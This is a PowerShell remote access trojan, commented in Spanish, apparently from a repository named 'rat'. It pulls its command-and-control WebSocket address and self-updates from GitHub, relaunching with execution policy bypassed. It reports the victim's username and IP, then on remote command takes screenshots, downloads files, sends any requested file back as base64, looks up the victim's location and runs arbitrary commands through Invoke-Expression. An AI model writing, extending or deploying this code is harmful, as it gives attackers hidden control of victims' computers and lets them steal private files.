# --- CONFIGURACIÓN DEL AUTO-UPDATER ---
$CurrentScriptVersion = "1.0.1"

# URLs de actualización
$VersionCheckUrl = "https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/version"
$ScriptDownloadUrlTemplate = "https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/remote_control_v%7B0%7D.ps1"

# --- CONFIGURACIÓN DEL WEBSOCKET ---
$UriConfigUrl = "https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/url"

$connectionTimeoutSeconds = 300
$reconnectDelaySeconds = 1

# --- COMIENZO DEL SCRIPT ---

# Agrega los ensamblados necesarios
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms

# --- OBTENER URI DESDE GITHUB ---
$uri = $null
try {
    Write-Host "Obteniendo WebSocket URI..."
    $uri = Invoke-RestMethod -Uri $UriConfigUrl -UseBasicParsing -TimeoutSec 10
    $uri = $uri.Trim()
    Write-Host "URI cargada: $uri"
} catch {
    Write-Error "No se pudo obtener la URI. Error: $($_.Exception.Message)"
    Exit
}

# --- FUNCIÓN DE AUTO-UPDATER ---
function Update-Script {
    param(
        [string]$currentVersion,
        [string]$versionUrl,
        [string]$downloadUrlTemplate
    )

    Write-Host "Verificando actualizaciones..."
    $latestVersion = $null
    try {
        $latestVersion = Invoke-RestMethod -Uri $versionUrl -UseBasicParsing -TimeoutSec 10
        $latestVersion = $latestVersion.Trim()
        Write-Host "Última versión disponible: $latestVersion"
    } catch {
        Write-Warning "No se pudo verificar la versión. Error: $($_.Exception.Message)"
        return
    }

    if ($latestVersion -ne $null -and [version]$latestVersion -gt [version]$currentVersion) {
        Write-Host "¡Hay una nueva versión disponible! Descargando..."
        $downloadUrl = $downloadUrlTemplate -f $latestVersion
        $scriptPath = $MyInvocation.MyCommand.Path
        $tempScriptPath = "$scriptPath.tmp"

        try {
            Write-Host "Descargando desde: $downloadUrl"
            Invoke-WebRequest -Uri $downloadUrl -OutFile $tempScriptPath -UseBasicParsing -TimeoutSec 60

            Start-Sleep -Seconds 2

            if (Test-Path $scriptPath) {
                Remove-Item $scriptPath -Force
            }

            Rename-Item $tempScriptPath -NewName $scriptPath -Force

            Write-Host "Script actualizado a la versión $latestVersion. Reiniciando..."
            Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
            Exit

        } catch {
            Write-Error "Error durante la actualización: $($_.Exception.Message)"
            if (Test-Path $tempScriptPath) {
                Remove-Item $tempScriptPath -Force
            }
        }
    } else {
        Write-Host "El script está actualizado (Versión $currentVersion)."
    }
}

# --- FUNCIÓN PARA OBTENER DATOS DE RED DE FORMA SEGURA ---
function Get-SystemInfo {
    $user = $env:USERNAME
    $ip = $null
    try {
        # Intenta obtener la IP, si falla, se queda como $null
        $ip = (Get-NetIPAddress -AddressFamily IPv4 |
               Where-Object { $_.IPAddress -notlike "169.254*" -and $_.InterfaceOperationalStatus -eq "Up" } |
               Select-Object -First 1 -ExpandProperty IPAddress)
        if ([string]::IsNullOrWhiteSpace($ip)) {
            Write-Warning "No se pudo obtener una dirección IP válida."
        }
    } catch {
        Write-Warning "Error al obtener información de red: $($_.Exception.Message)"
    }
    return @{ User = $user; IP = $ip }
}

# --- FUNCIÓN PRINCIPAL DEL SCRIPT CON RECONEXIÓN ---
function MainLoop {
    param(
        [string]$webSocketUri,
        [int]$connectTimeout,
        [int]$reconnectDelay
    )

    $ws = $null
    $systemInfo = Get-SystemInfo # Obtener información del sistema una vez al inicio

    while ($true) { # Bucle infinito para mantener el script y la conexión activos
        if ($ws -eq $null -or $ws.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
            Write-Host "Intentando conectar a $webSocketUri..."
            $ws = New-Object System.Net.WebSockets.ClientWebSocket
            try {
                $connectTask = $ws.ConnectAsync($webSocketUri, [System.Threading.CancellationToken]::None)
                
                # Espera con timeout para la conexión inicial
                if ($connectTask.Wait($connectTimeout * 1000)) {
                    Write-Host "Conexión WebSocket exitosa."
                    # Notificación de conexión, solo si tenemos info válida
                    if ($systemInfo.User -and $systemInfo.IP) {
                        Send-Back "$($systemInfo.User) $($systemInfo.IP) se ha conectado"
                    } elseif ($systemInfo.User) {
                        Send-Back "$($systemInfo.User) se ha conectado (IP no disponible)"
                    } else {
                        Write-Warning "No se pudieron obtener los datos del usuario/IP para la notificación de conexión."
                    }
                    
                    # --- Bucle de recepción de mensajes ---
                    while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
                        try {
                            $buffer = New-Object byte[] 16384
                            # Timeout de ReceiveAsync para no quedarse colgado
                            $receiveTask = $ws.ReceiveAsync($buffer, [System.Threading.CancellationToken]::None)
                            
                            if (-not $receiveTask.Wait($connectTimeout * 1000)) { 
                                # Timeout de recepción: si ocurre, no es un error fatal, solo reintentamos
                                Write-Warning "Timeout de recepción de datos (esperando $connectTimeout segundos)."
                                if ($ws.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
                                    Write-Host "La conexión WebSocket se ha cerrado durante el timeout de recepción."
                                    break # Sale del bucle de recepción para reconectar
                                }
                                continue # Sigue esperando si el estado es Open
                            }
                            $result = $receiveTask.Result

                            if ($result.Count -eq 0) {
                                if ($result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
                                    Write-Host "La conexión WebSocket se ha cerrado por el servidor."
                                    break # Sale del bucle de recepción para reconectar
                                }
                                continue # Si no hay datos pero no es Close, sigue esperando
                            }

                            $msg = [Text.Encoding]::UTF8.GetString($buffer, 0, $result.Count).Trim()
                            if ([string]::IsNullOrWhiteSpace($msg)) { continue }

                            Write-Host "Mensaje recibido: $msg"

                            # --- Procesar comandos ---
                            ProcessCommand -msg $msg

                        } catch [System.Net.WebSockets.WebSocketException] {
                            # Captura errores específicos de WebSocket
                            Write-Error "Error de WebSocket durante recepción: $($_.Exception.Message)"
                            break # Sale del bucle de recepción para reconectar
                        } catch {
                            # Captura cualquier otro error general que ocurra durante la recepción
                            # Este es el error que estabas viendo: "Excepción al llamar a 'Wait'..."
                            Write-Error "Error general en el bucle de recepción: $($_.Exception.Message)"
                            # Este error puede indicar un problema más profundo, pero forzamos la reconexión
                            break # Sale del bucle de recepción para reconectar
                        }
                    }
                    # Si salimos del bucle de recepción (ya sea por break o por cierre del socket)
                    Write-Host "La conexión WebSocket se ha cerrado o perdido. Intentando reconectar en $reconnectDelay segundos..."
                    
                } else {
                    Write-Warning "La conexión inicial al WebSocket excedió el tiempo de espera ($connectTimeout segundos)."
                }
            } catch {
                # Captura errores durante ConnectAsync
                Write-Error "Error al conectar al WebSocket: $($_.Exception.Message)"
            } finally {
                # Asegurarse de que el socket se cierre correctamente si aún está abierto
                if ($ws -ne $null -and $ws.State -ne [System.Net.WebSockets.WebSocketState]::Closed) {
                    try {
                        $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Reconexión", [System.Threading.CancellationToken]::None).Wait()
                    } catch {
                        Write-Warning "Error al cerrar WebSocket antes de reconectar: $($_.Exception.Message)"
                    }
                }
                $ws.Dispose() # Liberar recursos
                $ws = $null # Resetear la variable para que se cree una nueva instancia al reconectar
            }
            
            # Esperar antes de intentar reconectar
            Write-Host "Esperando $reconnectDelay segundos antes de intentar reconectar..."
            Start-Sleep -Seconds $reconnectDelay
        }
    }
}

# --- FUNCIÓN PARA PROCESAR COMANDOS ---
function ProcessCommand {
    param(
        [string]$msg
    )
    switch ($msg) {
        "/help" {
            Send-Back "Comandos disponibles:`n/help`n&captura`n&download <url>`n&get <ruta>`n&webcam`n&location`n!<comando>"
        }
        "&captura" {
            try {
                $screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bitmap = New-Object System.Drawing.Bitmap($screenBounds.Width, $screenBounds.Height)
                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen($screenBounds.Location, [System.Drawing.Point]::Empty, $screenBounds.Size)

                $fileName = "captura_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
                $filePath = Join-Path $env:USERPROFILE "Desktop\$fileName"
                $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)

                $graphics.Dispose()
                $bitmap.Dispose()

                Send-Back "Captura de pantalla guardada en: $filePath"
            } catch {
                Send-Back "Error al capturar pantalla: $($_.Exception.Message)"
            }
        }
        "&webcam" {
            try {
                $screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bitmap = New-Object System.Drawing.Bitmap($screenBounds.Width, $screenBounds.Height)
                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen($screenBounds.Location, [System.Drawing.Point]::Empty, $screenBounds.Size)

                $fileName = "webcam_capture_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
                $filePath = Join-Path $env:USERPROFILE "Desktop\$fileName"
                $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)

                $graphics.Dispose()
                $bitmap.Dispose()

                Send-Back "Foto de la pantalla (simulando webcam) guardada en: $filePath"
            } catch {
                Send-Back "Error al intentar tomar foto de pantalla: $($_.Exception.Message)"
            }
        }
        ($msg -like "&download *") {
            try {
                $url = $msg.Substring("&download ".Length).Trim()
                $fileName = Split-Path $url -Leaf
                $destinationPath = Join-Path $env:USERPROFILE "Downloads\$fileName"
                
                Invoke-WebRequest -Uri $url -OutFile $destinationPath -UseBasicParsing -TimeoutSec 120
                
                Send-Back "Descarga completada: $destinationPath"
            } catch {
                Send-Back "Error en descarga: $($_.Exception.Message)"
            }
        }
        ($msg -like "&get *") {
            $path = $msg.Substring("&get ".Length).Trim()
            if (-not (Test-Path $path)) {
                Send-Back "Archivo no existe: $path"
                continue
            }

            try {
                $bytes = [System.IO.File]::ReadAllBytes($path)
                $b64 = [Convert]::ToBase64String($bytes)
                
                $fileName = Split-Path $path -Leaf
                $payload = "FILE:${fileName}:${b64}" # Corrección aplicada
                Send-Back $payload
            } catch {
                Send-Back "Error enviando archivo: $($_.Exception.Message)"
            }
        }
        "&location" {
            try {
                $locationInfo = Invoke-RestMethod -Uri "http://ipinfo.io/json" -TimeoutSec 10
                $city = $locationInfo.city
                $region = $locationInfo.region
                $country = $locationInfo.country
                $loc = "$city, $region, $country"
                Send-Back "Ubicación aproximada (basada en IP): $loc"
            } catch {
                Send-Back "Error obteniendo ubicación: $($_.Exception.Message)"
            }
        }
        default {
            if ($msg.StartsWith("!")) {
                $commandToExecute = $msg.Substring(1).Trim()
                try {
                    # Ejecutar comando y capturar salida estándar y de error
                    $output = Invoke-Expression $commandToExecute 2>&1 | Out-String
                    if ([string]::IsNullOrWhiteSpace($output)) {
                        $output = "[comando ejecutado sin salida]"
                    }
                    Send-Back $output
                } catch {
                    Send-Back "[Error ejecutando comando '$commandToExecute': $($_.Exception.Message)]"
                }
            }
        }
    }
}

# --- FUNCIÓN PARA ENVIAR MENSAJES (necesaria para que ProcessCommand funcione) ---
function Send-Back($text) {
    # Verifica que la instancia de WebSocket exista y esté abierta antes de intentar enviar
    if ($ws -ne $null -and $ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
        try {
            $bytes = [Text.Encoding]::UTF8.GetBytes($text)
            $ws.SendAsync(
                [System.ArraySegment[byte]]::new($bytes),
                [System.Net.WebSockets.WebSocketMessageType]::Text,
                $true,
                [System.Threading.CancellationToken]::None
            ).Wait()
        } catch {
            Write-Error "Error al enviar mensaje: $($_.Exception.Message)"
        }
    } else {
        Write-Warning "No se pudo enviar mensaje: el WebSocket no está conectado o está cerrado."
    }
}

# --- INICIO DEL SCRIPT ---

# Ejecutar la función de actualización al inicio
# Asegúrate de configurar correctamente $CurrentScriptVersion, $VersionCheckUrl y $ScriptDownloadUrlTemplate arriba
Update-Script -currentVersion $CurrentScriptVersion -versionUrl $VersionCheckUrl -downloadUrlTemplate $ScriptDownloadUrlTemplate

# Iniciar el bucle principal que maneja la conexión y reconexión
MainLoop -webSocketUri $uri -connectTimeout $connectionTimeoutSeconds -reconnectDelay $reconnectDelaySeconds
